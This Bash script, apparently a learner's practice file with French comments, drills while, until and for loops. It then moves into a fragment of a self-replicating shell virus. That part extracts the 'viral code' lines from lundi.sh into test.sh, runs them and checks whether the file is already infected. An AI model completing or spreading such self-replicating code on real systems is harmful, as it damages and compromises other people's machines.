#! /bin/bash

number=10
num2=10

while [ $number -ge 0 ]
do
echo "$number"
number=$(( number-1 ))
done

until [ $num2 -le 3 ]
: ' Until veut dire: faire ... tant que la condition est fausse
i.e quand la condition devient vraie on arrete
'
do
echo $num2
num2=$(( num2-1 ))
done

echo "
"

for i in 1 2 3 4 5
do 
echo "Salam"
done

for i in {1..10..2} #for(i=0;i<10;i+2) On aurait pu l'ecrire sans l'incrementation
do
echo $i
done

for (( i=0; i<5; i++ ))
do
echo "Salam3likom"
done

for (( i=1; i<10; i++ ))
do
	if [[ $i -eq 2 || $i -eq 6 ]]
	then
		continue
	elif (( $i == 7 ))
	then
		break
	fi
	echo $i
done
L=23 # nombre de lignes de code viral
if [ ! -z $1 ] && [ $1 = "test" ]
then
echo "test" # affiche test quand c’est deja infecte
exit 0
fi
touch test.sh # fichier temporaire de test de surinfection
chmod u+x test.sh

# gestion de la surinfection
tail -n $L lundi.sh > test.sh # on r´ecup`ere le code viral
t=$(echo -n $(./test.sh "test")) # execution test
echo $t
echo $L

if [ "$t" != "test" ]
then
echo "pas infecte"
fi








